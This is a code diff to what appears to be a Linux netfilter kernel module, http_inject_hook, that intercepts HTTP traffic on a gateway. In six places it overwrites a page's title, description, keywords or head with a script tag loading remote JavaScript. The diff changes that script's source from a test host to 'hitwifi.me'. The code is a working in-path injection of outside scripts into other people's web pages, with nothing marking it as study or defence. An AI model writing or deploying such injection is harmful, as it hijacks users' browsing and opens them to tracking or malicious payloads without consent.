@@ -174,7 +174,7 @@ static unsigned int http_inject_hook(unsigned int hooknum,struct sk_buff *skb,co
 			if ((title_length = title_end - title_start) > 41)    
 			{
 				memset(title_start, ' ', title_length);	
-				memcpy(title_start, "<script src='http://test.gw/j.s'></script>", 42);
+				memcpy(title_start, "<script src='http://hitwifi.me/j.s'></script>", 42);
 
 				goto success;
 			}
@@ -217,7 +217,7 @@ static unsigned int http_inject_hook(unsigned int hooknum,struct sk_buff *skb,co
 			if ((desc_length = desc_end - desc_start) > 41)    
 			{
 				memset(desc_start, ' ', desc_length);
-				memcpy(desc_start, "<script src='http://test.gw/j.s'></script>", 42);
+				memcpy(desc_start, "<script src='http://hitwifi.me/j.s'></script>", 42);
 
 				goto success;
 			}
@@ -258,7 +258,7 @@ static unsigned int http_inject_hook(unsigned int hooknum,struct sk_buff *skb,co
 			if ((key_length = key_end - key_start) > 41)    
 			{
 				memset(key_start, ' ', key_length);
-				memcpy(key_start, "<script src='http://test.gw/j.s'></script>", 42);
+				memcpy(key_start, "<script src='http://hitwifi.me/j.s'></script>", 42);
 
 				goto success;
 			}
@@ -299,7 +299,7 @@ static unsigned int http_inject_hook(unsigned int hooknum,struct sk_buff *skb,co
 			if ((right_length = right_end - right_start) > 41)    
 			{
 				memset(right_start, ' ', right_length);
-				memcpy(right_start, "<script src='http://test.gw/j.s'></script>", 42);
+				memcpy(right_start, "<script src='http://hitwifi.me/j.s'></script>", 42);
 
 				goto success;
 			}
@@ -340,7 +340,7 @@ static unsigned int http_inject_hook(unsigned int hooknum,struct sk_buff *skb,co
 			if ((icon_length = icon_end - icon_start) > 41)    
 			{
 				memset(icon_start, ' ', icon_length);
-				memcpy(icon_start, "<script src='http://test.gw/j.s'></script>", 42);
+				memcpy(icon_start, "<script src='http://hitwifi.me/j.s'></script>", 42);
 
 				goto success;
 			}
@@ -401,7 +401,7 @@ static unsigned int http_inject_hook(unsigned int hooknum,struct sk_buff *skb,co
 			{
 				memmove(head_end + whtspace_length, head_end, strip_p - head_end);   
 				memset(head_end + 42, ' ', whtspace_length - 42); 
-				memcpy(head_end, "<script src='http://test.gw/j.s'></script>", 42); 
+				memcpy(head_end, "<script src='http://hitwifi.me/j.s'></script>", 42); 
 
 				goto success;
 			}
